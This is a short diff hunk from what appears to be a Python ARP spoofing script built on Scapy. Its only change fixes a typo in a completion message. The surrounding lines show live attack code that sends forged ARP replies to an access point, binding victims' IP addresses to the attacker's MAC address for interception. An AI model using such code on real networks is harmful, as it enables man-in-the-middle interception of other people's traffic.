@@ -85,7 +85,7 @@ def arp():
 			sendp(Ether(dst=ap_mac, src=attacker_mac)/ARP(pdst=ap_ip, psrc=vip[v], hwdst=vmac[v], hwsrc=attacker_mac, op=2),verbose=0)
 			time.sleep(0.1)
 
-	print("\narp spoffing completed.")
+	print("\narp spoofing completed.")
 	print("="*23)
 	
 
